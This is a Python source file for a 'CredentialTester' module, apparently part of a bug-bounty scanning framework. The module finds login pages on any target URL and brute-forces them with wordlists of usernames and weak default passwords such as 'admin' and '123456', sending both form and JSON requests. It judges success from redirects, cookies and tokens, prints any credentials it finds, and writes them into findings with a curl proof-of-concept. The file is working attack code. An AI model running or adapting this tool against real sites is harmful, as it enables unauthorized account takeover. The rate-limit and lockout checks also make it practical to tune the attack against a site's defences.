import asyncio
from typing import List, Dict, Optional, Tuple, Set
from core.base_module import BaseModule, Finding
from pathlib import Path


class CredentialTester(BaseModule):
    """Test for brute force vulnerabilities with stealth - Universal Version"""

    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.max_attempts   = config.get('max_attempts', 50)
        self.delay          = config.get('delay_between', 1)
        self.wordlist_path  = config.get('wordlist_path', 'wordlists')

    async def run(self, target: str, **kwargs) -> List[Finding]:
        """Run brute force tests"""
        self.logger.info(f"Testing brute force protections on {target}")

        if not kwargs.get('enable_brute_force', False):
            self.logger.info("Brute force testing disabled (use --enable-brute-force to enable)")
            return self.findings

        # UNIVERSAL APPROACH: Always test the target URL directly
        # plus discover any additional endpoints
        login_endpoints = await self._discover_login_forms(target)
        
        # Always add the target URL as a direct test endpoint
        # This ensures we test even if no forms are detected
        target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
        
        # Check if target is already in the list
        target_exists = any(ep['url'] == target_url for ep in login_endpoints)
        
        if not target_exists:
            self.logger.info(f"Adding direct target test: {target_url}")
            login_endpoints.insert(0, {
                'url': target_url,
                'type': 'direct',
                'fields': {
                    'username_fields': ['email', 'username', 'user', 'login', 'name'],
                    'password_field': 'password',
                    'username_field': 'email',
                    'email_field': 'email'
                },
                'discovered_at': 'direct_target'
            })

        if not login_endpoints:
            self.logger.warning("No login endpoints discovered - this should never happen with universal mode")
            return self.findings

        self.logger.info(f"Testing {len(login_endpoints)} endpoint(s)")

        for endpoint in login_endpoints:
            await self._test_rate_limiting(endpoint)
            await self._test_brute_force(endpoint)

        return self.findings

    async def _discover_login_forms(self, target: str) -> List[Dict]:
        """Discover login endpoints using multiple strategies"""
        import re
        endpoints = []
        seen_urls = set()

        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"

        from urllib.parse import urlparse, urljoin
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Strategy 1: Test the target URL itself
        candidate_urls = [target]
        
        # Strategy 2: Common login paths
        common_paths = [
            '/login', '/signin', '/auth', '/authenticate',
            '/admin', '/admin/login', '/user/login', '/account/login',
            '/api/login', '/api/auth', '/api/token', '/oauth/token',
            '/wp-login.php', '/administrator/index.php',
            '/admin.html', '/login.html', '/signin.html',
            '/auth/login', '/user/signin', '/member/login',
            '/dashboard/login', '/manage/login', '/control/login',
            # API endpoints
            '/api/v1/login', '/api/v2/login', '/graphql',
            '/rest/login', '/json/login', '/ajax/login'
        ]
        
        for path in common_paths:
            candidate_urls.append(base + path)

        # Strategy 3: Check for query parameters that might indicate login
        if parsed.query:
            candidate_urls.append(target)

        for url in candidate_urls:
            if url in seen_urls:
                continue
            seen_urls.add(url)

            try:
                self.logger.debug(f"Checking: {url}")
                response = await self._make_request(url)
                
                if not response:
                    continue

                # Accept more status codes (including 401, 403 which might indicate protected login)
                if response.status not in [200, 301, 302, 401, 403, 405, 500]:
                    continue

                text = await response.text()
                if not text:
                    continue

                # Strategy A: Look for login indicators in HTML/JS
                indicators = [
                    'password', 'login', 'username', 'email', 'sign in', 'log in',
                    'signin', 'passwd', 'credentials', 'authentication',
                    'auth', 'token', 'session', 'oauth', 'sso'
                ]
                
                has_login_indicators = any(ind in text.lower() for ind in indicators)
                
                # Strategy B: Look for form fields (even hidden or JS-generated)
                fields = self._extract_form_fields(text)
                
                # Strategy C: Check if it's an API endpoint (JSON response)
                is_api = 'application/json' in response.headers.get('Content-Type', '') or \
                         text.strip().startswith(('{', '['))
                
                # Strategy D: Check for JavaScript frameworks that might render login forms
                js_frameworks = ['react', 'vue', 'angular', 'ember', 'next.js', 'nuxt']
                has_js_framework = any(fw in text.lower() for fw in js_frameworks)
                
                # ACCEPT if any strategy indicates this might be a login endpoint
                if has_login_indicators or fields['inputs'] or is_api or has_js_framework:
                    
                    # Determine post URL
                    post_url = url
                    if fields.get('action'):
                        action = fields['action']
                        if action.startswith('http'):
                            post_url = action
                        elif action.startswith('/'):
                            post_url = base + action
                        else:
                            post_url = urljoin(url, action)

                    endpoint_info = {
                        'url': post_url,
                        'type': 'api' if is_api else ('js_framework' if has_js_framework else 'form'),
                        'fields': fields,
                        'discovered_at': url,
                        'indicators_found': has_login_indicators,
                        'is_api': is_api
                    }
                    
                    endpoints.append(endpoint_info)
                    self.logger.info(f"Found login endpoint: {post_url} (type: {endpoint_info['type']}, from: {url})")

            except Exception as e:
                self.logger.debug(f"Login discovery error on {url}: {e}")

        # Remove duplicates
        seen = set()
        unique = []
        for ep in endpoints:
            if ep['url'] not in seen:
                seen.add(ep['url'])
                unique.append(ep)

        return unique

    def _extract_form_fields(self, html: str) -> Dict:
        """Extract form fields from HTML/JS with comprehensive detection"""
        import re
        fields = {
            'inputs': [],
            'username_fields': [],
            'password_field': None,
            'action': '',
            'method': 'POST'
        }
        
        if not html:
            return fields
        
        # Find all input fields (including those in JavaScript)
        # Pattern 1: Standard HTML inputs
        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE)
        
        # Pattern 2: Inputs in JavaScript/React (name=, name:, etc.)
        js_inputs = re.findall(r'name["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
        
        # Pattern 3: Look for common field names in the entire text
        common_patterns = [
            r'["\'](email|username|user|login|name)["\']',
            r'["\'](password|passwd|pwd|pass)["\']',
            r'["\'](token|auth|session)["\']'
        ]
        for pattern in common_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            inputs.extend(matches)
        
        fields['inputs'] = list(set(inputs + js_inputs))
        
        # Find form action
        action_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if action_match:
            fields['action'] = action_match.group(1)
        
        # Find form method
        method_match = re.search(r'<form[^>]+method=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if method_match:
            fields['method'] = method_match.group(1).upper()
        
        # Categorize fields with extensive patterns
        username_patterns = [
            'email', 'mail', 'e-mail', 'username', 'user', 'uname', 
            'login', 'name', 'account', 'userid', 'user_id', 'auth_user',
            'identity', 'identifier', 'phone', 'mobile', 'cell'
        ]
        
        password_patterns = [
            'password', 'passwd', 'pwd', 'pass', 'user_password',
            'auth_pass', 'secret', 'key', 'credential'
        ]
        
        # Detect username fields
        for inp in fields['inputs']:
            inp_lower = inp.lower()
            for pattern in username_patterns:
                if pattern in inp_lower and inp not in fields['username_fields']:
                    fields['username_fields'].append(inp)
                    break
        
        # Detect password field (take the first match)
        for inp in fields['inputs']:
            inp_lower = inp.lower()
            for pattern in password_patterns:
                if pattern in inp_lower:
                    fields['password_field'] = inp
                    break
            if fields['password_field']:
                break
        
        # If no fields detected, use universal defaults
        if not fields['username_fields']:
            # Check if page mentions email vs username
            html_lower = html.lower()
            if 'email' in html_lower or 'e-mail' in html_lower:
                fields['username_fields'] = ['email', 'username', 'user']
            elif 'username' in html_lower:
                fields['username_fields'] = ['username', 'email', 'user']
            else:
                # Universal fallback - try all common names
                fields['username_fields'] = ['email', 'username', 'user', 'login', 'name']
        
        if not fields['password_field']:
            fields['password_field'] = 'password'
        
        # Set backward compatibility fields
        fields['username_field'] = fields['username_fields'][0]
        fields['email_field'] = fields['username_fields'][0]
        
        self.logger.debug(f"Detected fields: {fields['username_fields']} / {fields['password_field']}")
        
        return fields

    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        """Load usernames and passwords from wordlists"""
        usernames = []
        passwords = []

        user_file = Path(self.wordlist_path) / 'usernames.txt'
        if user_file.exists():
            with open(user_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(usernames)} usernames")
        else:
            self.logger.warning(f"Usernames file not found: {user_file}")
            usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']

        pass_file = Path(self.wordlist_path) / 'passwords.txt'
        if pass_file.exists():
            with open(pass_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(passwords)} passwords")
        else:
            self.logger.warning(f"Passwords file not found: {pass_file}")
            passwords = ['admin', 'password', '123456', 'login', 'admin123']

        return usernames, passwords

    def _generate_username_variations(self, base_usernames: List[str]) -> Set[str]:
        """Generate all possible username variations"""
        variations = set()
        
        for username in base_usernames:
            variations.add(username)
            
            if '@' in username:
                local_part = username.split('@')[0]
                variations.add(local_part)
                variations.add(local_part + '@email.com')
                variations.add(local_part + '@gmail.com')
            else:
                variations.add(username + '@email.com')
                variations.add(username + '@gmail.com')
                variations.add(username + '@admin.com')
        
        return variations

    async def _test_brute_force(self, endpoint: Dict):
        """Universal brute force test - works with any endpoint type"""
        url = endpoint['url']
        fields = endpoint.get('fields', {})
        
        # Get username fields with universal fallback
        username_fields = fields.get('username_fields', ['email', 'username', 'user', 'login'])
        password_field = fields.get('password_field', 'password')
        is_api = endpoint.get('is_api', False)
        
        self.logger.info(f"Starting brute force on {url}")
        self.logger.info(f"Fields: usernames={username_fields}, password={password_field}")

        base_usernames, passwords = self._load_wordlists()
        all_usernames = self._generate_username_variations(base_usernames)
        
        self.logger.info(f"Testing {len(all_usernames)} usernames × {len(passwords)} passwords")

        successful_logins = []
        rate_limited = False
        attempt_count = 0

        for username in all_usernames:
            for password in passwords:
                attempt_count += 1
                
                # UNIVERSAL STRATEGY: Send data in multiple formats
                # Format 1: Form data (standard)
                login_data = {password_field: password}
                for field in username_fields:
                    login_data[field] = username
                
                # Ensure common field names are covered
                for standard_name in ['email', 'username', 'user', 'login']:
                    if standard_name not in login_data:
                        login_data[standard_name] = username

                try:
                    self.logger.debug(f"Attempt {attempt_count}: {username}:{password}")
                    
                    # Try form-encoded POST first
                    response = await self._make_request(
                        url, 
                        method='POST', 
                        data=login_data, 
                        allow_redirects=False,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'}
                    )

                    # If form fails, try JSON (for APIs)
                    if not response and is_api:
                        response = await self._make_request(
                            url,
                            method='POST',
                            json=login_data,
                            allow_redirects=False,
                            headers={'Content-Type': 'application/json'}
                        )

                    if not response:
                        continue

                    is_success = await self._check_login_success(response, url)

                    if is_success:
                        self._report_success(username, password, url, attempt_count, username_fields, password_field)
                        return

                    # Rate limiting check
                    if response.status in [429, 503, 403]:
                        rate_limited = True
                        self.logger.warning(f"Rate limited (HTTP {response.status}) after {attempt_count} attempts")
                        break

                    # Check response text for lockout
                    text = await response.text()
                    lockout_indicators = [
                        'locked', 'blocked', 'too many attempts',
                        'try again later', 'suspended', 'account disabled'
                    ]
                    if any(ind in text.lower() for ind in lockout_indicators):
                        self.logger.warning(f"Account lockout detected")
                        break

                except Exception as e:
                    self.logger.error(f"Attempt {attempt_count} error: {e}")

            if rate_limited or successful_logins:
                break

        if not successful_logins and not rate_limited:
            self.logger.info(f"No credentials found after {attempt_count} attempts")

        if rate_limited:
            self._add_rate_limit_finding(url, attempt_count)

    def _report_success(self, username: str, password: str, url: str, attempts: int, username_fields: List[str], password_field: str):
        """Report successful login finding"""
        sep = "=" * 60
        print(f"\n\033[91m{sep}\033[0m")
        print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
        print(f"\033[92m      Username : {username}\033[0m")
        print(f"\033[92m      Password : {password}\033[0m")
        print(f"\033[92m      URL      : {url}\033[0m")
        print(f"\033[92m      Attempts : {attempts}\033[0m")
        print(f"\033[91m{sep}\033[0m\n")

        finding = Finding(
            module='brute_force',
            title=f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
            severity='Critical',
            description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
            evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
            poc=f"curl -X POST '{url}' -d '{username_fields[0]}={username}&{password_field}={password}'",
            remediation='Implement strong password policy, rate limiting, and account lockout',
            cvss_score=9.8,
            bounty_score=5000,
            target=url
        )
        self.add_finding(finding)

    def _add_rate_limit_finding(self, url: str, attempts: int):
        """Add rate limiting finding"""
        finding = Finding(
            module='brute_force',
            title='Rate Limiting Detected During Brute Force',
            severity='Info',
            description=f'Rate limiting triggered after {attempts} attempts',
            evidence={'attempts': attempts, 'url': url},
            poc=f"Send {attempts} login requests to {url}",
            remediation='Rate limiting is working correctly',
            cvss_score=0.0,
            bounty_score=0,
            target=url
        )
        self.add_finding(finding)

    async def _check_login_success(self, response, url: str) -> bool:
        """Universal login success detection"""
        try:
            status = response.status
            
            # Redirect-based success
            if status in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if location:
                    success_paths = ['/dashboard', '/admin', '/home', '/profile', '/welcome', '/panel', '/main']
                    failure_paths = ['/login', '/signin', '/error', '/fail', '/denied']
                    
                    if any(p in location.lower() for p in success_paths):
                        self.logger.info(f"Success: redirect to {location}")
                        return True
                    if any(p in location.lower() for p in failure_paths):
                        return False

            # Content-based success (200 OK)
            if status == 200:
                text = await response.text()
                text_lower = text.lower()

                # Immediate failure indicators
                failures = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied', 'unauthorized', 'try again']
                for f in failures:
                    if f in text_lower:
                        return False

                # Success indicators
                successes = ['welcome', 'dashboard', 'logout', 'profile', 'admin panel', 'successful', 'session', 'token']
                success_count = sum(1 for s in successes if s in text_lower)

                # Session cookie check
                cookies = response.headers.get('Set-Cookie', '').lower()
                if any(c in cookies for c in ['session', 'token', 'auth', 'jwt']):
                    return True

                if success_count >= 2:
                    return True

            # API success (JSON with token)
            if status in [200, 201] and 'application/json' in response.headers.get('Content-Type', ''):
                text = await response.text()
                if any(k in text.lower() for k in ['token', 'access_token', 'auth_token', 'session']):
                    return True

            return False

        except Exception as e:
            self.logger.error(f"Error checking success: {e}")
            return False

    async def _test_rate_limiting(self, endpoint: Dict):
        """Test rate limiting"""
        url = endpoint['url']
        responses = []

        for i in range(min(5, self.max_attempts)):
            try:
                response = await self._make_request(
                    url, 
                    method='POST',
                    data={'username': f'test{i}@test.com', 'password': 'wrong123'}
                )
                if response:
                    responses.append(response.status)
            except:
                responses.append('error')
            await asyncio.sleep(0.5)

        if 429 in responses or 503 in responses or 403 in responses:
            self.logger.info(f"Rate limiting detected on {url}")
        else:
            finding = Finding(
                module='brute_force',
                title='Missing Rate Limiting on Authentication',
                severity='High',
                description=f'No rate limiting on {url} after {len(responses)} rapid requests',
                evidence={'endpoint': url, 'requests': len(responses), 'responses': responses},
                poc=f"Send rapid login requests to {url}",
                remediation='Implement rate limiting (max 5 attempts per IP per 15 minutes)',
                cvss_score=7.5,
                bounty_score=1000,
                target=url
            )
            self.add_finding(finding)
